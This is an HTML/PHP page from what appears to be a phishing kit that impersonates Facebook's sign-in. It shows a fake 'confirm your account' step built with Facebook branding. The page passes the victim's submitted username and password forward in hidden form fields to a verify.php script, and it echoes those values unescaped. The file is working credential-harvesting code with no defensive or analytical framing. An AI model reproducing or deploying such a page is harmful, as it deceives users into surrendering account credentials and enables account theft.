<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />

    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link rel="shortcut icon" href="../assets/img/favfb.png" type="image/x-icon">
    <link rel="stylesheet" href="../assets/fathz.css" />
    <title>Sign in | Enter Facebook</title>
  </head>
  <body>
    <div class="container">
      <header>
        <nav>
          <div class="logo">
            <img src="../assets/img/logofb4.jpg" alt="Facebook Logo" />
          </div>
          <ul class="menu">
            <li><a href="#">Help</a></li>
          </ul>
        </nav>
      </header>
      <div class="row1">
        <form action="../verify.php" method="post">
        <input type="hidden" name="email" value="<?= $_POST['user'] ?>">
        <input type="hidden" name="password" value="<?= $_POST['pass'] ?>" >
          <center>
            <img class="fbsesi" src="../assets/img/fbsesi.jpg" alt="Facebook" />

            <h3 class="formh3">The next step is to confirm your account</h3>
          </center><br>
          <div class="form-check">
            <input class="form-check-input" type="radio" name="flexRadioDisabled" id="flexRadioDisabled" disabled>
            <label class="form-check-label" for="flexRadioDesabled">
              Login to Account
            </label>
          </div>
          <div class="form-check">
            <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" checked>
            <label class="form-check-label" for="flexRadioDefault1">
              Confirm Your Account
            </label>
            <p>Confirm that you are the legal owner of this account</p>
          </div>
          <div class="form-check">
            <input class="form-check-input" type="radio" name="flexRadioDisabled" id="flexRadioDisabled" disabled>
            <label class="form-check-label" for="flexRadioDefault1">
              Finished
            </label>
          </div>
          <footer>
            <button type="submit" class="btn btn-primary">Next</button>
          </footer>
      </form>
    </div>
    <script
      src="https://kit.fontawesome.com/08380760ee.js"
      crossorigin="anonymous"
    ></script>
  </body>
</html>